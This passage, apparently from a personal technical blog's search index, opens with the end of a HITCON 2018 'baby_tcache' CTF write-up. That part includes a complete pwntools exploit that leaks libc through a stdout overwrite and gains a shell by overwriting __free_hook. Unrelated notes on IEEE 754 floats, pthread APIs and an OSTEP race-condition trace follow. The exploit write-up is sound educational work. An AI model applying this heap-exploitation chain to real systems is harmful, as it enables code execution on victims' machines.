src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png" alt="image-20230420001600223"></p><p></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png" alt="image-20230420003955229"></p><p></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png" alt="image-20230420004449167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png" alt="image-20230420004531732"></p><h3 id="freehook"><a href="#freehook" class="headerlink" title="freehook"></a>freehook</h3><p>unsortbin</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png" alt="image-20230420005729367"></p><p>4</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code>chunk4chunk4tcache</p><p><code>delete(4) add(0x530) add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png" alt="image-20230420010052891"></p><p>freehookonegadget</p><p><code>add(0x60,p64(libcelf.symbols[&#39;__free_hook&#39;]))</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png" alt="image-20230420010633032"></p><p><code>add(0x60) add(0x60,p64(onegadget))</code></p><p><code>delete(0)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png" alt="image-20230420010811418"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./baby_tcache&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/mnt/hgfs/Share/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;x&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 </span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># db(&#x27;b malloc&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0D83)&#x27;)</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">66</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">libcelf.address=libc</span><br><span class="line">onegadget=libc+<span class="number">0x4f302</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0xa0</span>,p64(libcelf.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache </tag>
            
            <tag> IO FILE </tag>
            
            <tag> Null Byte Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>An interview question from baidu</title>
      <link href="/2023/04/17/An-interview-question-from-baidu/"/>
      <url>/2023/04/17/An-interview-question-from-baidu/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU [1]&gt; gcc -m32 -g -o  test test.c</span><br><span class="line">test.c: In function main:</span><br><span class="line">test.c:4:18: warning: format %d expects argument of type int, but argument 2 has type double [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 0    </span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc  -g -o  test test.c</span><br><span class="line">test.c: In function main:</span><br><span class="line">test.c:4:18: warning: format %d expects argument of type int, but argument 2 has type double [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 1853816616</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = -600037016</span><br></pre></td></tr></table></figure><p>IA-32, <code>a=0</code>; x86-64, <code>a</code></p><h2 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h2><h3 id="IEEE-754"><a href="#IEEE-754" class="headerlink" title="IEEE 754"></a>IEEE 754</h3><p>IEEE 754</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420111646829.png" alt="image-20230420111646829"></p><p> 1(sign) 8(exponent) 23(significand)</p><p> 1 11 52</p><ul><li><p></p><ul><li><p>exp01</p></li><li><p> E&#x3D;e-Bias  ps:</p><ul><li>eexp</li><li>Bias&#x3D;2<sup>k-1</sup>-1 2<sup>8-1</sup>-1&#x3D;127 2<sup>11-1</sup>-1&#x3D;1023</li><li> 1-127~254-127-126<del>+127 -1022</del>+1023 (exp01)</li></ul></li><li><p>significand1.121,</p></li><li><p>Value&#x3D;(1)<sup>s</sup>2<sup>exp-Bias</sup>*(frac+1)</p></li></ul></li><li><p></p><ul><li>exp0</li><li>E&#x3D;1-Bias<ul><li>32-12664-1022</li></ul></li><li>0.10</li><li></li><li>0+0,-0</li><li>(exp)</li></ul></li><li><p></p><ul><li>exp1<ul><li>0inf(infinity) +inf-inf 00inf</li><li><strong>0</strong>Nan(not a number)Nanfalse</li></ul></li></ul></li><li><p>nan <strong>xincluding NaN and </strong></p><table><thead><tr><th>Comparison</th><th>NaN  <em>x</em></th><th>NaN  <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN  <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="https://www.toolhelper.cn/Digit/FractionConvert">https://www.toolhelper.cn/Digit/FractionConvert</a></p><p><a href="https://www.h-schmidt.net/FloatConverter/IEEE754.html">https://www.h-schmidt.net/FloatConverter/IEEE754.html</a></p><h3 id="IA-32"><a href="#IA-32" class="headerlink" title="IA-32"></a>IA-32</h3><p>ia32</p><p>double10.001010.001.01.010*2<sup>3</sup>,S&#x3D;0E&#x3D;1023+3&#x3D;100 0000 0010b significand&#x3D;010</p><p><code>0 10000000010 0100000000000000000000000000000000000000000000000000</code>   hex&#x3D;0x4024000000000000</p><p>32(fastcallC&#x2F;C++_cdecl)</p><p>IA-32x87 FPU</p><blockquote><p>FPU880R0~R7FPUTOP3top-1+17topR0</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418232538589.png" alt="image-20230418232538589"></p><p>st0topst0</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230419133610761.png" alt="image-20230419133610761"></p><p>8080</p><p></p></blockquote><p></p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420110749224.png" alt="image-20230420110749224"></p><p>_cdecl ()8double</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418113446986.png" alt="image-20230418113446986"></p><p>int0</p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>IA-64IA-64</p><p>64x64SSE3d</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140620437.png" alt="image-20230418140620437"></p><p>xmm0(ripriprip)</p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140809555.png" alt="image-20230418140809555" style="zoom:80%;"><p>%drsi</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141359969.png" alt="image-20230418141359969"></p><p>FFFFDF48-8,376</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141756625.png" alt="image-20230418141756625"></p><p>c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">12</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">6.666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f\n&quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f&quot;</span>, y, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc -g -o  test test.c</span><br><span class="line">test.c: In function main:</span><br><span class="line">test.c:8:14: warning: format %d expects argument of type int, but argument 2 has type double [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |             ~^      ~</span><br><span class="line">      |              |      |</span><br><span class="line">      |              int    double</span><br><span class="line">      |             %f</span><br><span class="line">test.c:8:17: warning: format %f expects argument of type double, but argument 3 has type int [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |                ~^      ~</span><br><span class="line">      |                 |      |</span><br><span class="line">      |                 double int</span><br><span class="line">      |                %d</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">12,6.666000</span><br><span class="line">12,6.666000 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IEEE 754 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 Thread Api</title>
      <link href="/2023/04/15/OSTEP-27-Thread-Api/"/>
      <url>/2023/04/15/OSTEP-27-Thread-Api/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="POSIX"><a href="#POSIX" class="headerlink" title="POSIX"></a>POSIX</h3><p><strong></strong></p><blockquote><p><code>#include &lt;pthread.h&gt;</code></p><p><code>pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER</code><br><br><code>int pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr);</code></p><p>pthread_mutex_init(mutex,NULL)PTHREAD_MUTEX_INITIALIZER</p><p>attr</p><p><code>int pthread_mutexattr_gettype(pthread_mutexattr_t *attr,int *kind);</code></p><p><code>int pthread_mutexattr_settype(pthread_mutexattr_t *attr,int kind);  </code></p><ul><li><p><code>PTHREAD_MUTEX_NORMAL</code></p></li><li><p>PTHREAD_MUTEX_TIMED_NP<strong></strong><em></em></p></li><li><p>PTHREAD_MUTEX_RECURSIVE_NP<strong></strong><em>unlock</em></p></li><li><p>PTHREAD_MUTEX_ERRORCHECK_NP<strong></strong><em>EDEADLK</em>PTHREAD_MUTEX_TIMED_NP</p></li><li><p>pshared <code>PTHREAD_PROCESS_PRIVATE</code>  <code>PTHREAD_PROCESS_SHARED</code> <code>PTHREAD_PROCESS_PRIVATE</code></p></li></ul><p>00</p></blockquote><p><strong> </strong></p><blockquote><p>()</p><p><code>int pthread_mutex_lock(pthread_mutex_t* mutex); </code></p><p> 0</p><p><code>int pthread_mutex_trylock(pthread_mutex_t* mutex);</code></p><p><strong></strong>tsptr<strong></strong>thread_mutex_lock</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timedlock</span><span class="params">(<span class="type">pthread_mutex_t</span> mutex, <span class="type">const</span> <span class="keyword">struct</span> timespec *tsptr)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> struct timespec &#123;</span></span><br><span class="line"><span class="comment"> time_t tv_sec;  // </span></span><br><span class="line"><span class="comment"> long tv_nsec;   // </span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time_out</span>;</span></span><br><span class="line">   clock_gettime(CLOCK_REALTIME, &amp;time_out);</span><br><span class="line">   time_out.tv_sec += seconds;</span><br><span class="line">pthread_mutex_timedlock(mutex,&amp;time_out)</span><br></pre></td></tr></table></figure><p></p><p><code>int pthread_mutex_unlock(pthread_mutex_t* mutex); </code></p><p>00</p></blockquote><p><strong></strong></p><blockquote><p><code>int pthread_mutex_destroy(pthread_mutex_t *mutex);</code></p><p></p><p>00</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<span class="comment">//12</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Sum</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_lock(&amp;mutex));</span><br><span class="line">        sum++;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_unlock(&amp;mutex));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> x;</span><br><span class="line">    <span class="type">pthread_t</span> pid1, pid2;</span><br><span class="line">    pthread_create(&amp;pid1, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;pid2, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p><strong></strong></p><blockquote><p></p><p>pthread_cond_t  cond&#x3D;PTHREAD_COND_INITIALIZER  </p><p>int  pthread_cond_init(pthread_cond_t  *cond,  pthread_condattr_t  *cond_attr)</p></blockquote><p><strong> </strong></p><blockquote><p>&gt;&gt;&gt;</p><p><code>int pthread_cond_wait(pthread_cond_t *cond, pthread_mutex_t *mutex);</code></p><p>,</p><p><code>int pthread_cond_timedwait(pthread_cond_t *cond, pthread_mutex_t*mutex, const struct timespec *abstime);</code></p><p>pthread_cond_waitabstimeETIMEOUT</p><p>&gt;&gt;&gt;</p><p><code>int pthread_cond_signal(pthread_cond_t *cond);</code></p><p></p><p><code>int pthread_cond_broadcast(pthread_cond_t *cond);</code></p><p></p></blockquote><p><strong></strong></p><blockquote><p><code>int  pthread_cond_destroy(pthread_cond_t  *cond)</code></p><p>  </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (flag == <span class="literal">false</span>) &#123;<span class="comment">//whileif? POSIXpthread_cond_signalpthread_cond_wait</span></span><br><span class="line">            <span class="comment">// pthreadwhilewhile</span></span><br><span class="line">            pthread_cond_wait(&amp;cond, &amp;lock);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread_func, <span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);<span class="comment">//flag = true;while (flag == false)</span></span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//flag</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//flag</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;lock);</span><br><span class="line">    pthread_cond_destroy(&amp;cond);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:26 Concurrency:An Introduction Homework</title>
      <link href="/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/"/>
      <url>/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/</url>
      
        <content type="html"><![CDATA[<ul><li>critical section</li><li>race condition</li></ul><ol start="3"><li></li></ol><p></p><ol start="6"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat looping-race-nolock.s</span><br><span class="line"><span class="meta"># assumes %bx has loop count in it</span></span><br><span class="line"></span><br><span class="line">.main</span><br><span class="line">.top</span><br><span class="line"><span class="meta"># critical section</span></span><br><span class="line">mov <span class="number">2000</span>, %ax  <span class="meta"># get <span class="string">&#x27;value&#x27;</span> at address 2000</span></span><br><span class="line">add $<span class="number">1</span>, %ax    <span class="meta"># increment it</span></span><br><span class="line">mov %ax, <span class="number">2000</span>  <span class="meta"># store it back</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># see <span class="keyword">if</span> we<span class="string">&#x27;re still looping</span></span></span><br><span class="line"><span class="string"><span class="meta">sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 0 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 0</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 1 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 1</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span 